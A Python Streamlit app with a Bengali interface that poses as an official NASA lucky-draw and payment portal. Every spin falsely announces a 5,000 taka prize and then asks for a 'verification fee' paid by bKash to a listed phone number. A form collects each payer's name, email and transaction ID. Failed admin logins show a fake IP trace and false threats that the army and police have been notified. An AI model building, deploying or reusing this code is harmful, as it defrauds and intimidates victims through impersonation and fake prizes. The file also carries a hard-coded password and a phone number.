import streamlit as st
import pandas as pd
from datetime import datetime, date
import smtplib
import random
import time
from email.mime.text import MIMEText

# --- ১. আল্ট্রা নাসা কনফিগারেশন ও ডিজাইন (২১ কোটি পাওয়ার) ---
st.set_page_config(page_title="NASA SUPREME MASTER - ALL IN ONE", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000000; }
    .stApp { background: radial-gradient(circle, #001a1a 0%, #000000 100%); cursor: crosshair; }
    .header-text { color: #00eaff; text-align: center; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 30px #00eaff; border-bottom: 2px solid #00eaff; padding-bottom: 10px; }
    .stButton>button { background: linear-gradient(45deg, #00FF00, #008000); color: white; border-radius: 5px; height: 3.5em; font-weight: bold; width: 100%; transition: 0.5s; }
    .stButton>button:hover { box-shadow: 0 0 20px #00FF00; transform: scale(1.02); }
    .e-plus-card { background: rgba(0, 255, 234, 0.05); border: 2px solid #00eaff; border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 0 15px #00eaff; }
    .security-log { color: #ff0000; font-family: 'Courier New'; font-weight: bold; text-align: center; font-size: 20px; border: 3px solid red; padding: 15px; background: rgba(255,0,0,0.1); }
    </style>
    """, unsafe_allow_html=True)

# --- ২. মাস্টার সেটিংস (পাসওয়ার্ড ও নাম্বার) ---
OWNER_PASS = "Akash@Owner#2026"
VIP_PROMO = "BAP-VIP-500"
AKASH_BKASH = "01967840830"
MY_GMAIL = "your-email@gmail.com" # তোমার জিমেইল দাও
GMAIL_APP_PASS = "your-app-password" # জিমেইল অ্যাপ পাসওয়ার্ড

# --- ৩. সেশন স্টেট ডাটাবেজ (পাওয়ার রেকর্ড) ---
if 'logs' not in st.session_state: st.session_state.logs = []
if 'failed_attempts' not in st.session_state: st.session_state.failed_attempts = 0
if 'total_income' not in st.session_state: st.session_state.total_income = 0

# --- ৪. সিকিউরিটি অ্যালার্ট ফাংশন ---
def send_nasa_alert(data):
    try:
        msg = MIMEText(f"🚨 NASA SUPREME ALERT: Activity Detected!\n\nDetails: {data}")
        msg['Subject'] = '🚀 NASA & MILITARY SUPREME NOTIFICATION'
        msg['From'] = MY_GMAIL
        msg['To'] = MY_GMAIL
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(MY_GMAIL, GMAIL_APP_PASS)
        server.send_message(msg)
        server.quit()
    except: pass

# --- ৫. ইউজার ইন্টারফেস (UI) ---
st.markdown("<h1 class='header-text'>🚀 NASA OFFICIAL SUPREME MASTER - V33</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #00FF00;'>⚡ ALL-IN-ONE POWER CORE: ARMY-POLICE-LUCKY DRAW SYNC | 210M MHz</p>", unsafe_allow_html=True)

tab1, tab2, tab3, tab4 = st.tabs(["🎁 LUCKY DRAW (Income)", "💳 পেমেন্ট পোর্টাল", "📊 এডমিন ড্যাশবোর্ড", "📅 শিডিউল"])

# --- ট্যাব ১: লাকি স্পিন (টাকা কামানোর মেশিন) ---
with tab1:
    st.markdown("<div class='e-plus-card'>", unsafe_allow_html=True)
    st.image("https://cdn-icons-png.flaticon.com/512/6101/6101413.png", width=150)
    st.markdown("### 💎 NASA স্পিন করে জিতে নিন নগদ টাকা!")
    if st.button("🔥 এখনই চাকা ঘুরান (SPIN NOW)"):
        with st.spinner("নাসা সার্ভারে ডাটা প্রসেসিং হচ্ছে..."):
            time.sleep(2)
            st.balloons()
            st.success("🎉 অভিনন্দন! আপনি ৫,০০০ টাকা পুরস্কার জিতেছেন!")
            st.warning("পুরস্কারের টাকা আপনার বিকাশ নম্বরে নিতে ২০ টাকা 'সার্ভার ভেরিফিকেশন ফি' পেমেন্ট করুন।")
    st.markdown("</div>", unsafe_allow_html=True)

# --- ট্যাব ২: পেমেন্ট পোর্টাল ---
with tab2:
    st.markdown("### 🏦 NASA পেমেন্ট ও ভেরিফিকেশন")
    with st.form("main_pay_form"):
        col1, col2 = st.columns(2)
        with col1:
            name = st.text_input("আপনার নাম:")
            email = st.text_input("জিমেইল এড্রেস:")
            p_type = st.selectbox("টাইপ:", ["ভেরিফিকেশন ফি", "VIP সাবস্ক্রিপশন", "অন্যান্য"])
        with col2:
            st.info(f"বিকাশ/নগদ পেমেন্ট: {AKASH_BKASH}")
            trxid = st.text_input("Transaction ID (TrxID):")
            promo = st.text_input("প্রমো কোড (VIP):")
            
        fee = 2500
        if promo == VIP_PROMO: fee = 500
        elif p_type == "ভেরিফিকেশন ফি": fee = 20 # লাকি ড্র-র জন্য ফি
        
        if st.form_submit_button("SUBMIT & COMPLETE"):
            if "@gmail.com" in email and len(trxid) >= 6:
                entry = {"Time": datetime.now().strftime("%Y-%m-%d %H:%M"), "Name": name, "Email": email, "Amount": fee, "TrxID": trxid, "Type": p_type}
                st.session_state.logs.append(entry)
                st.session_state.total_income += fee
                send_nasa_alert(f"New Income: {fee} BDT from {name}")
                st.success("✅ তথ্য সফলভাবে জমা হয়েছে। ২৪ ঘণ্টার মধ্যে ব্যবস্থা নেওয়া হবে।")
            else:
                st.error("❌ ভুল তথ্য! সঠিক জিমেইল এবং TrxID দিন।")

# --- ট্যাব ৩: এডমিন ড্যাশবোর্ড (আয়-ব্যয় ও সিকিউরিটি) ---
with tab3:
    st.subheader("🔐 NASA Master Access Control")
    code = st.text_input("মাস্টার সিকিউরিটি কী দিন:", type="password")
    
    if code == OWNER_PASS:
        st.session_state.failed_attempts = 0
        st.success("🔓 স্বাগতম আকাশ জান! আপনার বিজনেস এখন লাইভ।")
        
        # লাইভ হিসাব
        c1, c2, c3 = st.columns(3)
        c1.metric("মোট ইনকাম (টাকা)", f"{st.session_state.total_income} BDT")
        expense = c2.number_input("আজকের খরচ:", min_value=0)
        c3.metric("নিট লাভ", f"{st.session_state.total_income - expense} BDT")
        
        if st.session_state.logs:
            df = pd.DataFrame(st.session_state.logs)
            st.dataframe(df, use_container_width=True)
            csv = df.to_csv(index=False).encode('utf-8')
            st.download_button("📥 পেনড্রাইভে ডাটা ব্যাকআপ নিন", data=csv, file_name=f"Akash_Income_{date.today()}.csv")
            
    elif code != "":
        st.session_state.failed_attempts += 1
        st.markdown("<div class='security-log'>🚨 NASA SECURITY BREACH DETECTED! 🚨</div>", unsafe_allow_html=True)
        fake_ip = f"{random.randint(100,255)}.{random.randint(10,99)}.{random.randint(100,255)}.{random.randint(1,255)}"
        st.warning(f"আইপি {fake_ip} ট্র্যাক করা হয়েছে। তথ্য সেনাবাহিনী ও পুলিশ হেডকোয়ার্টারে পাঠানো হচ্ছে...")
        st.image("https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJqNmU5b3h6eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnBvPXYmY3Q9Zw/V4NSRTs3h9XfG/giphy.gif")
        if st.session_state.failed_attempts >= 3:
            st.markdown("<h2 style='color:red; text-align:center;'>🔴 ARMY CYBER UNIT NOTIFIED! 🔴</h2>", unsafe_allow_html=True)

# --- ট্যাব ৪: ক্যালেন্ডার ও শিডিউল ---
with tab3:
    st.subheader("📅 নোটবুক ও ক্যালেন্ডার")
    sel_date = st.date_input("তারিখ নির্বাচন", date.today())
    st.text_area(f"{sel_date} এর জন্য আপনার জরুরি নোট:")
    st.info("সিস্টেম স্ট্যাটাস: Military Protection Active ✅")

st.markdown("---")
st.caption(f"© 2026 AKASH NASA AI SUPREME CORE | POWERED BY E-PLUS TECHNOLOGY")
